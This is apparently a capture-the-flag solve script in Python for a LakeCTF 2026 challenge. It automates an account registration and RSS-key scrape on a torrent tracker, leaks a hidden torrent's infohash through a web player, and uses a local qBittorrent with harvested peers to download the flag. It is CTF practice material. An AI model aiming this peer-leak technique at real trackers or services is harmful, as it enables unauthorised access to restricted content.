
import requests
import sys
import time
import secrets
import re

TARGET_TRACKER = sys.argv[1] if len(sys.argv) > 1 else "http://chall.polygl0ts.ch:8080"
TARGET_WEBPLAYER = sys.argv[2] if len(sys.argv) > 2 else "http://chall.polygl0ts.ch:8081"

# register account
s = requests.Session()
username = secrets.token_hex(4)
password = secrets.token_hex(8)
try:
    r = s.get(f"{TARGET_TRACKER}/register", timeout=10)
    r.raise_for_status()
except requests.exceptions.RequestException as e:
    raise RuntimeError(f"Tracker not available: {e}")

def extract_hidden_inputs(html: str) -> dict:
    data = {}
    for match in re.finditer(r'<input([^>]+)>', html):
        attrs = match.group(1)
        name_m = re.search(r'name="([^"]+)"', attrs)
        value_m = re.search(r'value="([^"]*)"', attrs)
        type_m = re.search(r'type="([^"]+)"', attrs)
        
        if name_m:
            name = name_m.group(1)
            value = value_m.group(1) if value_m else ""
            input_type = type_m.group(1) if type_m else "text"
            
            if input_type in ("hidden", "text") and name not in ("username", "password", "remember"):
                data[name] = value
    return data

data = extract_hidden_inputs(r.text)
data["username"] = username
data["email"] = f"{username}@gmail.com"
data["password"] = password
data["password_confirmation"] = password

if "_token" not in data:
    raise RuntimeError("Could not find CSRF token on register page")
csrf_token = data["_token"]

r = s.post(f"{TARGET_TRACKER}/register", data=data)
if r.status_code != 200:
    raise RuntimeError("Registration failed. Check username and password.")
else:
    print(f"Registered with username: {username} and password: {password}", flush=True)

RSS_KEY = s.get(f"{TARGET_TRACKER}/users/{username}/rsskeys").text.split("<td>")[1].split("</td>")[0].strip()

print(f"RSS Key: {RSS_KEY}", flush=True)

print(requests.post(f"{TARGET_WEBPLAYER}/api/request-torrent", json={"id": 1}).json(), flush=True)

while True:
    res = requests.get(f"{TARGET_WEBPLAYER}/api/torrent-status/1").json()
    print(res, flush=True)
    if res["success"] and len(res["torrent"]["infohash_v1"]) == 40:
        break
    time.sleep(1)

flag_infohash = res["torrent"]["infohash_v1"]
magnet_link = f"magnet:?xt=urn:btih:{flag_infohash}"
print(f"Magnet link: {magnet_link}", flush=True)

seeded_torrent_url = TARGET_TRACKER + "/torrent/download/2." + RSS_KEY

# wait for qBittorrent to be ready
while True:
    try:
        res = requests.get("http://127.0.0.1:8080/api/v2/app/version").text
        print(f"qBittorrent version: {res}", flush=True)
        break
    except Exception as e:
        print(f"Waiting for qBittorrent to be ready... ({e})", flush=True)
        time.sleep(1)

# add seeded torrent to qBittorrent
print(seeded_torrent_url, flush=True)
res = requests.post("http://127.0.0.1:8080/api/v2/torrents/add", data={"urls": seeded_torrent_url, "savepath": "/downloads"})
print(res.text, flush=True)

while True:
    res = requests.get("http://127.0.0.1:8080/api/v2/torrents/info").json()
    if len(res) > 0:
        seeded_torrent_hash = res[0]["hash"]
        print(f"Added torrent hash: {seeded_torrent_hash}", flush=True)
        break
    time.sleep(1)

# get peers
print("Waiting for peers...", flush=True)
while True:
    res = requests.get(f"http://127.0.0.1:8080/api/v2/sync/torrentPeers?hash={seeded_torrent_hash}").json()
    peers = list(res["peers"].keys())
    if len(peers) > 0:
        print("Peers found", peers, flush=True)
        break
    print(".", end="", flush=True)
    time.sleep(0.1)

res = requests.post("http://127.0.0.1:8080/api/v2/torrents/add", data={"urls": magnet_link, "savepath": "/downloads"})
print(res.text, flush=True)

# add peer to magnet torrent
res = requests.post("http://127.0.0.1:8080/api/v2/torrents/addPeers", data={"hashes": flag_infohash, "peers": '|'.join(peers)})
print(res.text, flush=True)

print("Waiting for torrent to download...", flush=True)
while True:
    res = requests.get("http://127.0.0.1:8080/api/v2/torrents/info").json()
    print(res, flush=True)
    torrent = next((t for t in res if t["hash"] == flag_infohash), None)
    if torrent and torrent["completion_on"] > 0:
        print("Torrent downloaded successfully", flush=True)
        break
    time.sleep(1)

time.sleep(2)
with open("/downloads/LakeCTF.2026.The.Flag.iNTERNAL.LEAK-LAKECTF.txt", "r") as f:
    flag = f.read().strip()
    print(f"Flag: {flag}", flush=True)
